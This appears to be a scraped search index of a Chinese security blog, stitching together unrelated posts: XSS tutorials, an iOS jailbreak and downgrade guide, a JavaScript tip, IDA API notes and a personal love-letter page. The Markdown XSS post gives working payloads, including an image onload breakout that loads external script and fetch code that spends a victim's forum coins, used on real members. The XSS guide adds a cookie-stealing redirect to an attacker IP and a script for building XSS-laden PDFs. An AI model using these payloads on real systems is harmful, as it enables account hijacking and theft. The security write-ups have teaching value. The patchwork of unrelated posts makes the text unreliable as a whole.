这里是最流行的编程语言的列表，可用于白色，道德黑客。没有人会教你在大学期间详细的黑客 - 一些方法可能会显示， 但这就是它。白色黑客既合乎道德又有利可图，如果你决定学习如何使它成为利润来源，你将需要一些额外的时间。 如果您有其他一些不太关键的编程任务需要处理，请将其委托给专业编码帮助服务，如分配核心。专家编码员和计算机科学专家将覆盖您的请求，而您收到一些额外的时间，你可以花在白色黑客 - 学习和练习。 ","date":"2021-11-16","objectID":"/zh-cn/16-1/:1:0","tags":["黑客","编程语言"],"title":"前 5 种道德黑客编程语言","uri":"/zh-cn/16-1/"},{"categories":["黑客","编程语言"],"content":"Python - 高效和直接 这种语言简单易行，深受世界各地程序员的欢迎。很多黑客脚本和恶意软件都写在 Python 中。这就是为什么你会知道病毒是如何工作的，这样你就可以预测它，并试图找到未来的问题更早。 Python 擅长检查系统的安全完整性，对道德黑客也很重要。大量的开放式图书馆非常适合快速编写脚本和原型。据你所知，它运行没有汇编，所以它是完美的年轻黑客谁刚刚开始他们的方式在这个方向。 PHP - 网站流行的服务器边语言 谈到对 PHP 的黑客攻击，我们首先指的是同样使用此语言的黑客网站和内容管理系统。根据它的特殊性，它用于服务器侧场景。因此，您可以编写应用程序，以便对 Web 服务器进行更改，并使其成为攻击的简单目标。如果你在这样的应用程序中成功，那么你已经是一个白人黑客，因为你发现了一个系统漏洞。 Javascript (JS) - 广泛、多功能的语言 JS 适用于不同的任务。但对于黑客来说，在Node出现后，它变得非常有吸引力.js。此平台将 JS 从高度专业化的语言转变为通用语言。 JS 是开发跨站点脚本黑客程序的一种语言。如果 Web 应用程序存在弱点，则 JS 可以找到它们。这种语言对于前端 Web 组件操纵很有用。这不是一个简单的语言，所以你需要一些时间和愿望，成为良好的不仅在编码，而且在黑客。但万一成功，你将成为一个高素质的专业人士，薪水很高。 另见： 爪哇注射影响 Ruby - 面向网络，易于学习，难以使用 这种面向网络的简单学习，但很难使用的语言是接近Python的语法。Metasploit 框架的第三版写在 Ruby 上。它旨在提供有关漏洞的信息，帮助创建 IDS 签名、创建和测试漏洞。 正如你所看到的，这个著名的白色黑客工具的开发人员使用Ruby为他们的系统。它之所以发生，是因为它是最好的黑客语言之一，这要归功于它在编写漏洞时的高度灵活性。我们也不要忘记，很多最新的网络应用程序都写在Rails平台上，自动使Ruwe成为黑客攻击的最佳语言。 C/C++/C#语言 - 最适合企业软件 如果需要付费激活的公司软件的道德黑客是为你，那么 C 语言是给你的。C 是一种低级语言，因此，借其，您可以访问和操作计算机和系统硬件的低级资源。C 和 C++ 是黑客的常见语言，他们编写编程脚本以检查渗透率。开放的图书馆和庞大的社区总是准备帮助解决任何问题，甚至谈论道德黑客。 看起来像是缺少什么东西吗？如果有，请向我们提出，并提供自己的想法。我们将很乐意收集我们的读者的意见，并更新这篇文章关于编程语言的白色黑客。更多的语言在市场上流行起来，但大多数语言在最初的几年里都活不下去了，考虑不够周全，或者很难学习和使用。 ","date":"2021-11-16","objectID":"/zh-cn/16-1/:2:0","tags":["黑客","编程语言"],"title":"前 5 种道德黑客编程语言","uri":"/zh-cn/16-1/"},{"categories":["黑客","编程语言"],"content":"是否有更多用于白色黑客的编程语言？ 如您所见，此列表不包括难以学习和实践的特殊或未知语言。同时，了解其中任何一个可以让你随时改变黑客的职业。 编码的特殊性与黑客不同。但对于那些擅长黑客攻击的人来说，稍微纠正一下方向是没有问题的。这得益于与思维类型相关的一个功能。 IT 专家拥有全球思维和结构化系统。他们一般认为，但不失去细节。这种方法提供简单的任务之间的切换，即使它们来自不同的领域。工作、私人生活行为和对流程的深刻理解的强制性逻辑将 IT 开发人员与任何其他职业区分开来。 黑客行为也与道德问题有关。如果你确信破坏不是你的方式，当你显示错误并帮助纠正错误时，你会感到更快乐，那么白色黑客是完美的。 ","date":"2021-11-16","objectID":"/zh-cn/16-1/:3:0","tags":["黑客","编程语言"],"title":"前 5 种道德黑客编程语言","uri":"/zh-cn/16-1/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: 此跨站点脚本（XSS） 备忘单包含许多向量，可以帮助您绕过 WAF 和过滤器。您可以根据事件、标签或浏览器选择向量，并且每个向量都包含概念验证。 您可以下载 XSS 备忘单的 PDF 版本。 这张备忘单是由波特斯威格研究公司带到的。在推特上关注我们， 接收更新。 内容表 Event handlers No user interaction User interaction required Restricted characters Frameworks Protocols Other useful attributes Special tags Encoding Obfuscation Client side template injection VueJS reflected AngularJS sandbox escapes reflected AngularJS sandbox escapes DOM AngularJS CSP bypasses Scriptless attacks Polyglots WAF bypass global objects Content types Response content types Impossible labs Prototype pollution Classic vectors (XSS crypt) 点击🔎详细查看 ","date":"2021-11-16","objectID":"/zh-cn/xss/:0:0","tags":[],"title":"跨站点脚本 （XSS） 备忘单","uri":"/zh-cn/xss/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"T00LS在前段时间开启了markdown支持，这个漏洞也正是markdown的问题导致。 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。 Markdown本身是一种标记语言，在网页上的应用也很简单，比如当我在markdown中输入**加粗**，那么经过转换之后，这个短句将会变成\u003cstrong\u003e加粗\u003c/strong\u003e。其实也是一系列的html转换，由此就会出现很多XSS的问题。 下面我结合T00LS的实例简单说一说Markdown的XSS漏洞。 ","date":"2021-11-16","objectID":"/zh-cn/16/:0:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"最基础的栗子，点击触发XSS 很多人了解markdown以后，可能想到的第一个XSS就是这个。 我们知道markdown可以插入超链接。用法如下： [Mr·Yang的博客](http://ybrc.github.io) 渲染出来的效果如下： Mr·Yang的博客 那么如果我们使用伪协议呢？比如： [XSS](javascript:alert(1)) 答案是可以弹框。然后我们弹出Cookies就会发现Discuz的cookies都设置了httponly，也就说说无法用javascript来获取cookies。 但是我们可以获取Discuz的formhash呀，在Discuz中，为了防止CSRF，几乎每个操作都使用了formhash，我们能获取到formhash，就可以操作当前账户几乎所有的动作了。 那么用js如何获取Dz的formhash呢？ 在帖子正文页，我们可能会需要回帖，所以肯定会有formhash，如下： 那就很简单了。 获取到formhash以后，我们可以选择直接发送ajax请求来用formhash做点“有趣的事情”，比如发帖，转账？ ","date":"2021-11-16","objectID":"/zh-cn/16/:1:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"高级一点，自动触发 在上面的操作中，我们需要被攻击者点击超链接才可以触发漏洞，那么我们能不能直接触发呢？ 我们先来看看在markdown中如何使用图片吧。栗子如下： ![头像](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg) 渲染效果如下： 我们先来看看转换后的html长啥样吧： 我们在[]中输入的内容变成了html中的alt，那么如果我们在这中间用双引号是否能够逃逸出来，加个onload或者onerror属性呢？ 比如： ![头像\" onload=alert(1)](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg) 输出结果如下： 很明显alert后面多了一个双引号，所以我们简单改一下payload，注释掉后面： ![头像\" onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg) 然后刷新以后： 果然执行了…… 这个时候已经自动触发了。 输出样式如下： 一个能自动触发的XSS，可比需要点击的XSS威力大了许多。 但是在实战中我们要执行的js代码可能会非常长，所以在onload里面写js难免会很麻烦。 so 我们需要引入外部js。 ","date":"2021-11-16","objectID":"/zh-cn/16/:2:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"再高级一些，引入外部js 这次我们直接点，payload如下： ![头像\" onload=s=createElement('script');body.appendChild(s);s.src='外部js的url';//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg) 比如我们引用一个弹出formhash的js： 这里我用到了安全盒子的XSS平台，地址是x.secbox.cn 成功弹出formhash： ","date":"2021-11-16","objectID":"/zh-cn/16/:3:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"实例：转走别人的Tubi 我们先来选一个目标，这里我就选择我们团队的核心大佬 @phithon 了。 为了不误伤其他小伙伴，我这里就编辑我以前的帖子，发给phithon师傅去看，从而触发XSS。 基本思路如下： p神访问触发XSS 获取formhash ajax请求模拟赞赏帖子 这里选择赞赏贴子的原因是因为银行转账需要输入论坛密码，无法模拟转账，我们只是做漏洞演示，所以赞赏就够啦。 赞赏也是可以自定义tubi的，我们就来“偷”10个p神的tubi吧~ ","date":"2021-11-16","objectID":"/zh-cn/16/:4:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"payload编写 很简单的payload就不解释了，如下： var formhash = document.getElementsByName('formhash')[0].value; fetch(\"https://www.t00ls.net/misc.php?action=userrate\u0026userratesubmit=yes\u0026infloat=yes\u0026inajax=1\u0026inajax=1\", { method: \"POST\", credentials: \"include\", headers: { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Upgrade-Insecure-Requests\": \"1\", \"Connection\": 'keep-alive', }, body: \"formhash=\" + formhash + \"\u0026tid=39705\u0026do=dashang\u0026handlekey=userrate\u0026score=%2B10\u0026reason=thanks\" }).then(function(res) { if (res.ok) { alert(\"谢谢你的10Tubi！！！\"); } }, function(e) { alert(\"Error submitting form!\"); }); 然后引入一下,即可“偷”tubi： 那么我们现在把这个帖子发给phithon师傅去看。 好了，我们现在再把这个url发给雨神： 战果： 感谢phithon和lcy的1tubi，还有雨神的10tubi。 ","date":"2021-11-16","objectID":"/zh-cn/16/:4:1","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"实例：蠕虫 不敢写，想想整个T00LS都弥漫着蠕虫的气息，我就觉得害怕。 ","date":"2021-11-16","objectID":"/zh-cn/16/:5:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":["WEB","漏洞","攻击","XSS","MarkDown"],"content":"漏洞修复及总结 markdown转换到html后，再进行一系列的过滤吧，html属性白名单什么的，也可以使用开源的项目，比如：http://htmlpurifier.org/ 其实这个拿到Discuz的formhash能做的事情很多很多…… 比如置顶帖子，修改版规，等等，如果是有后台权限的管理员触发，或许还可以模拟后台的一些操作，危害是挺大的。 最后再次感谢phithon和lcy的1tubi，还有雨神的10tubi。 抱拳了老铁。 ","date":"2021-11-16","objectID":"/zh-cn/16/:6:0","tags":["WEB","漏洞","攻击","XSS","MarkDown"],"title":"对使用Markdown的帖子正文XSS利用","uri":"/zh-cn/16/"},{"categories":[],"content":" -- body { margin: 0; padding: 0; background: #000; font-size: 12px; overflow: auto } #mainDiv { width: 100%; height: 100% } #loveHeart { float: right; width: 670px; height: 625px } #garden { width: 100%; height: 100% } #elapseClock { text-align: right; font-size: 18px; margin-top: 10px; margin-bottom: 10px } #words { font-family: \"sans-serif\"; width: 500px; font-size: 24px; color: #666 } #messages { display: none } #elapseClock .digit { font-family: \"digit\"; font-size: 36px } #loveu { padding: 5px; font-size: 22px; margin-top: 80px; margin-right: 120px; text-align: right; display: none } #loveu .signature { margin-top: 10px; font-size: 20px; font-style: italic } #clickSound { display: none } #code { float: right; width: 440px; height: 800px; color: #333; font-family: \"Consolas\", \"Monaco\", \"Bitstream Vera Sans Mono\", \"Courier New\", \"sans-serif\"; font-size: 12px } #code .string { color: #2a36ff } #code .keyword { color: #7f0055; font-weight: bold } #code .placeholder { margin-right: 15px } #code .space { margin-right: 7px } #code .comments { color: #3f7f5f } #copyright { margin-top: 20px; text-align: center; width: 100%; color: #666 } #errorMsg { width: 100%; text-align: center; font-size: 24px; position: absolute; top: 100px; right: 0 } #copyright a { color: #666 } $(function() { $.fn.snow({ minSize: 5, //雪花的最小尺寸 maxSize: 50, //雪花的最大尺寸 newOn: 150 //雪花出现的频率 这个数值越小雪花越多 }); }); -- /** * Mrs·Cai：今天是2021年11月16日。 * 我写这个网站来纪念这个特殊的日子。 * 虽然，我不是一个很擅长表达言语的人。 * 但我希望你能记住曾经我们在一起的每一刻。 */ Girl U = new Girl(\"Mrs·Cai\"); Boy I = new Boy(\"Mr·Yang\");// 今天是11月16日。 // 转瞬想起了你。 // 我把你的美丽记录在日记里，让文字把你的青春铭记。 // 我把你的笑容粘贴在日记里，让图片把你的活泼记忆。 // 我把你的照片夹进日记里，让爱情把你的幸福牢系。 // 对我来说是曾经那些重要的时刻，秒秒让我深深爱上你！ // 当我凝视你的眼，当我听到你的声音。 // 当我闻到你身上淡淡的幽香。 // 我爱你; //当我感受到我剧烈的心跳，我明白了： I Miss U; // 你在我心中最美。 我本想照顾你 // 可是不行了！ // 你虽为他人之妻, 但我依然喜欢着你！。 我会 永远 喜欢; 一直 喜欢你 我有一颗永远不变的心 // 我认为这是一个重要的决定。 // 你可以在任何时候决定。 喜欢你 = 想你 我非常高兴能认识你 Mrs·Cai,I Miss U： Miss U--Mr·Yang var offsetX = $(\"#loveHeart\").width() / 2; var offsetY = $(\"#loveHeart\").height() / 2 - 55; var together = new Date(); together.setFullYear(2008, 09, -32); together.setHours(00); together.setMinutes(0); together.setSeconds(0); together.setMilliseconds(0); if (!document.createElement('canvas').getContext) { var msg = document.createElement(\"div\"); msg.id = \"errorMsg\"; msg.innerHTML = \"Your browser doesn't support HTML5!Recommend use Chrome 14+/IE 9+/Firefox 7+/Safari 4+\"; document.body.appendChild(msg); $(\"#code\").css(\"display\", \"none\") $(\"#copyright\").css(\"position\", \"absolute\"); $(\"#copyright\").css(\"bottom\", \"10px\"); document.execCommand(\"stop\"); } else { setTimeout(function() { startHeartAnimation(); }, 5000); timeElapse(together); setInterval(function() { timeElapse(together); }, 500); adjustCodePosition(); $(\"#code\").typewriter(); } ","date":"2021-11-15","objectID":"/zh-cn/loveu/:0:0","tags":[],"title":"MissU","uri":"/zh-cn/loveu/"},{"categories":[],"content":"1、JS被加载顺序 解决方法：采用window.onload = function () {} window.onload 功能：强行等到HTML加载完后立即执行该函数。 这里需要注意的是，window.onload并不是万能贴，实际上，当存在两个函数都需要在HTML加载完后执行的时候， 即： window.onload = function1; window.onload = function2; window.onload只会加载最后一个函数 解决方法： 1.直接创建一个匿名函数来容纳这两个函数，然后把这个函数绑定到onload事件上。 即： window.onload = function(){ firstFunc(); secFunc(); } 它确实能很好的工作——在需要绑定的函数不是很多的场合，这应该是最简单的解决方法。 2、弹性最佳的解决方案——不管你打算在页面加载完毕时执行多少个函数，它都可以应付自如。 这个方案由Simon Willison提出（详见：http://simon.incutio.com ） //将这个addLoadEvent放到你的js文件之中 function addLoadEvent (func) { var oldonload = window.onload; if (typeof window.onload != ‘function’) { window.onload = func; }else { window.onload = function(){ oldonload(); func(); } }; } //当你需要调用需要window.onload的函数时，使用以下语法。 addLoadEvent(firstFunc); addLoadEvent(secFunc); 以上就是关于前端一个小坑点的故事啦~ 祝code愉快~ ","date":"2021-11-15","objectID":"/zh-cn/15-1/:0:0","tags":[],"title":"关于JS加载顺序和window.onload的一些问题","uri":"/zh-cn/15-1/"},{"categories":["逆向","MacOS","IOS"],"content":"此文为加密收费内容添加我微信支付后可看: 最近也在慢慢开始接触一些macOS/iOS安全，首先一个难题就是环境搭建。现在的情况是我有一台mac pro 13 2020和一个iphone 7 Plugs，分别记录一下vmware安装macOS虚拟机和iOS越狱降级这两个在调试macOS/iOS内核之前必须做的准备工作。 ","date":"2021-11-15","objectID":"/zh-cn/15/:0:0","tags":["逆向","MacOS","IOS"],"title":"iPhone逆向环境搭建","uri":"/zh-cn/15/"},{"categories":["逆向","MacOS","IOS"],"content":"vmware安装macOS虚拟机 目前主要有两种方式搭建macOS虚拟机： 1.在macOS物理机上能够使用vmware fusion/virtualbox或者vagrant搭建macOS虚拟机，说起来倒是很简单：用vmware fusion应该不会有什么坑，用virtualbox也有人把要踩的坑总结好了：Run macOS 10.15 Catalina (and other versions) in VirtualBox on macOS。用vagrant参考偏执的iOS逆向研究员：收集全版本的macOS iOS+越狱+内核调试这篇文章即可。比较麻烦的是如果用vmware fusion/virtualbox的话sb苹果是不提供完整系统镜像的，得自己找；用vagrant的话又因为大家都知道的原因你得有一个很稳的梯子下那十几个G的镜像文件。 2.在linux/windows物理机上因为版权的原因默认是没有合法的手段让你装macOS虚拟机的，最最最常见的方法就是用unlocker patch掉vmware workstation pro然后安装macOS，当然镜像还是得自己找。推荐使用这个branch的unlocker：https://github.com/BDisp/unlocker/releases，当前最新的版本是3.0.3。这个branch的unlocker据我测试应该是能直接用不会有什么坑。不过这里还是要注意一个问题，unlocker中的gettools.exe会去下载com.vmware.fusion.zip.tar并且下载速度很慢，我们可以先去把这个包下好，下载的地址是到http://softwareupdate.vmware.com/cds/vmw-desktop/fusion找你用的vmware workstation pro对应的版本即可。更改gettool.py的代码，把下载com.vmware.fusion.zip.tar的代码注释掉，用pyinstaller重新打包一个gettools.exe。以管理员权限运行win-install.cmd，在time.sleep(20)的时候把下载好的com.vmware.fusion.zip.tar拷贝进tools目录即可。 接下来就可以安装macOS了，这里我用的镜像是网上找的一个10.10.2的，如果提示你”没有足够的空间来进行安装”按照网上的方法抹掉vmware的硬盘即可：OS X Base System 上没有足够的空间来进行安装。除此之外我没有遇到任何问题。 最后就是安装VMware Tools了，gettools.exe已经下载好了darwin.iso和darwinPre15.iso，我的vmware workstation pro是15.5.1版的，应该用darwinPre15.iso。 关闭虚拟机，编辑虚拟机，设置CD/DVD，使用ISO映像为darwinPre15.iso。开启虚拟机之后会看到桌面的VMware Tools，直接安装就OK了。 很多时候如果你发现github上某个工具因为已经没有维护而不能使用的时候一个小技巧就是去看看issue或者pull request里面有没有人还在继续维护。本来最先搜到的是https://github.com/theJaxon/unlocker，因为没有维护了所以遇到一点问题，在pull request里面找到了另外有人维护的https://github.com/BDisp/unlocker。去年也是，升级了vmware workstation pro之后https://github.com/sysprogs/VirtualKD也没法用了，在issue里面找到了另外有人维护的https://github.com/4d61726b/VirtualKD-Redux。想学习MachO文件格式，https://github.com/gdbinit/MachOView早已无人维护，在issue里面找到了另外有人维护的https://github.com/mythkiven/MachOView……感谢这些编写维护开源软件的大神，不然这些问题真是让人够头疼的。 ","date":"2021-11-15","objectID":"/zh-cn/15/:1:0","tags":["逆向","MacOS","IOS"],"title":"iPhone逆向环境搭建","uri":"/zh-cn/15/"},{"categories":["逆向","MacOS","IOS"],"content":"iOS越狱降级 首先肯定大家都明白越狱是个什么意思，就和你研究android安全肯定需要有一台root过的手机一样，我们也需要一台越狱的iPhone。不过越狱有四种。 完美越狱(Tethered Jailbreak) 不完美越狱(Untethered Jailbreak) 半完美越狱(Semi-tethered Jailbreak) 半不完美越狱(Semi-untethered Jailbreak) 我画了个图，你一看就明白了。tether是拴绳拴链的意思，tethered就是需要数据线连电脑，untethered就是不需要数据线连电脑。 如果你不知道你的iPhone能不能越狱，你可以到这个网站上查：https://canijailbreak.com/ 一看之后你就会发现这几年出的越狱都是半不完美越狱，因为现在苹果的保护措施越来越完善，完美越狱有当然是有，但是能值很多钱，人家不会公开。这几年越狱界最大的新闻就是被称为史诗级漏洞的checkm8了，因为这个漏洞存在于BootROM中，无法通过软件更新的方式修复，所以理论上来讲只要你的iPhone在受影响的设备范围内，不管你怎么升级系统都能用这个漏洞越狱。我们直接去https://checkra.in/下载越狱程序按照上面的说明来就可以了。越狱之后该在Cydia里面装什么等等网上都有很多文章了，这里就不再说了。 接下来说说怎么降级。降级不是你想降就能降的，iOS设备上的固件恢复需要配合Apple服务器进行校验，Apple停止公开验证某个固件版本时，iOS设备就不能从高版本恢复到停止验证的版本。iOS在更新设备固件的过程中会将设备的ECID等信息以及一个一次使用的nonce发送给Apple服务器，服务器在校验通过后会返回校验结果，结果使用非对称算法加密，在没有私钥的情况下无法解密也无法伪造。但是我们可以将校验结果保存下来，之后Apple不再提供此版本校验的时候重放校验过程，实现iOS降级到不提供验证的版本。 说了一大堆可能有点晕了，我们来实际操作一下。现在Apple只会验证最新的iOS 14.0.1版本，我的iPhone8是iOS 13，因为我以前没有保存校验结果，所以理论上现在我没有任何办法将我的iPhone8降级到一个更低的版本。但是现在我可以保存14.0.1的校验结果，假设说以后我的iPhone8升级到了iOS 14.0.2，理论上我就可以通过这个保存的校验结果降级到14.0.1。 首先checkra1n越狱之后我们添加repo:halo-michale.github.io/repo/，安装插件Generator Auto Setter，默认会写入Generator值为一串0x1把nonce固定，这样也方便我们以后降级。然后我们打开爱思助手查ECID： 点击查看设备详情查硬件模型： 然后到https://tsssaver.1conan.com/把这些信息填进去点击submit，就可以下载shsh2文件了。在将来的某个时候如果想降级到这个版本我们可以使用futurerestore，在设备进入kDFU/pwnDFU模式之后用像这样的命令完成降级： ./futurerestore -t xxx.shsh2 –latest-sep –latest-baseband xxxx.ipsw 更新的iPhone和iOS操作似乎还有些不一样，以后如果需要的话再补充。 不过这还没完，苹果还有一个SEP机制(Secure Enclave Processor，安全区域处理器)，如果降级的iOS系统与当前的SEP不兼容，那么降级会被禁止。iOS13范围内SEP都是兼容的，那么你只要备份过对应版本的shsh2文件，就可以在iOS13范围内降级。但是网上我看说如果你升级到iOS14，即使有iOS13的shsh2文件就会因为SEP不兼容无法降级。 所以iOS的越狱降级这些还真的挺头疼的…… 最后再扯下如何入门macOS/iOS安全，经过一段时间的探索我有如下想法： 1.学http://www.newosxbook.com/index.php上的三本书，建议海淘。国内那些写macOS/iOS的书我翻了几本得出的结论是都不用买。当然就这么看肯定是非常枯燥的，所以我建议有时间就翻翻，一次也不用看太多。 2.学习各种出现的macOS/iOS漏洞，主要是project zero的。 目前我也是积极在整理这些历史漏洞：https://github.com/houjingyi233/macOS-iOS-exploit-writeup 3.从推特或者关注的大牛那里获取一些他们的研究成果然后学习。 如果遇到其它环境方面的问题我也会继续在这篇文章里面更新，2022年争取也写一些macOS/iOS漏洞研究方面的文章！ ","date":"2021-11-15","objectID":"/zh-cn/15/:2:0","tags":["逆向","MacOS","IOS"],"title":"iPhone逆向环境搭建","uri":"/zh-cn/15/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":" web漏洞挖掘指南 ","date":"2021-11-14","objectID":"/zh-cn/14-3/:0:0","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"XSS跨站脚本攻击 ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:0","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"一、漏洞原理 \\1. 跨站脚本英文全称（Cross Site Scripting跨站脚本），为了不和css层叠样式表(英文全称：Cascading Style Sheets)混淆，因此将跨站脚本缩写为XSS。产生XSS漏洞根本原因其实是web应用未对用户的输入进行严格的过滤和转义，导致攻击者可从正常的输入功能注入脚本代码，我常将xss攻击理解为一种javascript注入，当带有xss恶意代码的页面被其他用户访问到时，js便会被执行，js脚本可以执行很多操作，比如：窃取用户cookie，读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。 ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:1","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"二、XSS漏洞检测 \\1. 公认XSS有三种类型：反射型、存储型、dom型。根据字面意思很好区分三者，反射型即服务器根据用户当前输入做出的响应，只能触发一次，这个过程就像一次反射。因此市面上大多self-xss都来自反射型xss，攻击者输入xss脚本，输出仅自己看到，仅xss到自己，常在查询、搜索等功能出现。 \\2. 存储型xss即页面保存了攻击者输入的恶意代码，除非对应记录被删除，否则可以一直触发xss，常在留言、个人信息登记等功能出现。 \\3. dom型xss比较独特，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。换种更好理解的说法也就是：从服务器脚本变成了客户端脚本，dom xss的payload不需要服务端解析响应，而是靠浏览器的dom解析，因此dom-xss的触发是抓不到请求包的。漏洞示例xss.html： \u003chtml\u003e \u003cbody\u003e \u003cdiv id=\"tr1\"\u003e\u003c/div\u003e \u003cscript\u003e document.getElementById(\"tr1\").innerHTML = unescape(location.hash); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e \\4. xss漏洞检测用弹窗进行测试即可，常见的几种弹窗方法：alert()、confirm()、prompt()、console.log()。测试时，尽量结合各种xss类型的特征对功能点进行验证，除了大家常说的“有框即插(看见输入框就盲插xss payload)”，还需注意请求中的各种参数，是否可以原样输出或者以html代码的形式保存到了另一个页面。 ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:2","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"三、XSS漏洞利用 \\1. 上文提到过，xss的本质其实是js代码的注入，所以XSS漏洞的危害来源于js代码执行，最常见的就是盗取用户cookie，但是在实际场景中我们经常会遇到cookie设置httponly属性导致无法通过js脚本读取的情况，这时还可以读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。 \\2. 以最简单的盗取cookie的payload为例，先用python搭建web服务充当xss平台： \\3. 然后在存有xss漏洞的位置传入payload：document.location=’http://192.168.123.24?’+document.cookie; \\4. 上述payload先用document.cookie获取了用户cookie，然后利用document.location进行跳转，这样客户端就会携带document.cookie的值访问xss平台，通过xss平台的web日志即可查看对应记录： \\5. 市面上的xss平台其实已经编写出很多成熟的xss利用模板了，js代码操作不熟练的师傅可以直接套用xss平台的模板： ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:3","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"四、Markdown XSS \\1. Markdown 是一种轻量级标记语言，它允许人们使用纯文本格式编写文档。通过简单的文本方式标记就能指定格式，轻轻松松完成文档的编辑。markdown语言从文本-指定格式的转换过程可以看作一系列的html转换，最终以html标签的形式存储在页面上，因此markdown编辑器也可能出现XSS漏洞。 \\2. 插入超链接： \\4. 除了插入超链接，我们还可以参照常规的XSS payload进行尝试，比如、等标签。参考案例： http://www.52bug.cn/hkjs/3292.html https://mp.weixin.qq.com/s/7Qa4o0sYfJei07K3mjL-GA ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:4","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["WEB","漏洞","攻击","XSS","挖掘"],"content":"五、上传PDF导致的XSS \\1. 之前在论坛上看到过有师傅通过把xss代码加到pdf文件，然后通过正常的文件上传功能传至目标服务器中，利用浏览器自带的pdf阅读功能触发xss，这类漏洞还是会有部分厂商会确认的，参考文章： https://www.t00ls.cc/thread-48480-1-1.html https://www.t00ls.cc/articles-62790.html pdf文件还是很少被禁止上传的，众测项目中可以尝试此类测试。 \\2. 利用条件：1.有pdf文件上传点 2.保存好的pdf文件可以直接浏览器查看，而不是只能下载至本地。 \\3. python脚本一键生成带有xss代码的pdf文件： from PyPDF2 import PdfFileWriter file = PdfFileWriter() file.addJS('app.alert(\"XSS\");') output = open('xss.pdf', 'wb') file.write(output) ","date":"2021-11-14","objectID":"/zh-cn/14-3/:1:5","tags":["WEB","漏洞","攻击","XSS","挖掘"],"title":"web漏洞挖掘指南 -XSS跨站脚本攻击","uri":"/zh-cn/14-3/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"常用IDA脚本开发API  本文所提及的api适用于IDA Pro 7.5，python3，内容来自权威指南和IDA官网，本文将其中的idc api找到了对应的python3 api，并省略了一些字符串操作函数以及文件输入输出函数，因为这些工作可以由python单独完成，故不对该类函数多做介绍。记录一下方便查阅。 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:0","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"1读取和修改数据的函数 idc.get_wide_byte(addr)，从虚拟地址addr处读取一个字节值 idc.get_wide_word(addr)，从虚拟地址addr处读取一个字（2字节）值 idc.get_wide_dword(addr)，从虚拟地址addr处读取一个双字（4字节）值 idc.get_qword(addr)，从虚拟地址addr处读取一个四字（8字节）值 ida_bytes.patch_byte(addr,byte)，设置虚拟地址addr处的一个字节值 ida_bytes.patch_word(addr,word)，设置虚拟地址addr处的一个字值 ida_bytes.patch_dword(addr,dword)，设置虚拟地址addr处的一个双字值 